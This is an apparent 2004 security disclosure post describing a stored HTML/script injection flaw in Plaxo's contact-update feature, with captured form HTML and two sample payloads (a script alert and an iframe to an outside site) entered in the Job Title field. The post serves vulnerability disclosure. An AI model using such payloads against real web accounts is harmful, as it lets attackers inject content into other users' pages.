Subject: PLAXO: is that a cure or a disease?




Friday, March 12, 2004

Having a firm belief in unnecessary gadgetry, we recently sent 
our most senior colleague Liu Die Yu a request to update his 
contact information via our plaxo device 
[http://www.plaxo.com/]. Checking back several hours later in 
our plaxo web account we eagerly selected his "card" to see what 
that update might be.

BANG !

<input type="hidden" name="SetReplied" value="">
<input type="hidden" name="perm" value="1">
<input type="hidden" name="saveChanges" value="1">
<input type="hidden" name="close" value="0">
<input type="hidden" name="Biz.FullName" value="fatcat">
<input type="hidden" name="Biz.Title" value=""><iframe 
src=http://www.bloatedcorp.com>">
<input type="hidden" name="Biz.Email1" 
value="fatcat@...atedcorp.com">
<input type="hidden" name="Biz.Email2"  value="">
<input type="hidden" name="Biz.Email3"  value="">
<input type="hidden" name="Biz.IM"  value="">
<input type="hidden" name="Biz.WebPage"  value="">

He had taken our entire contact list for a joyride supreme.

Trivial arbitrary code injection into the plaxo user web 
account. While it does a good job of attempting to defeat this, 
simple input in the recipient request for update field of  "JOB 
TITLE", gives a real jobbing:

"><SCRIPT>alert('boop')</SCRIPT>
"><iframe src=http://www.bloatedcorp.com>

Needless to say should you receive one of these irritating 
little requests, you'll now know what to do.


End Call
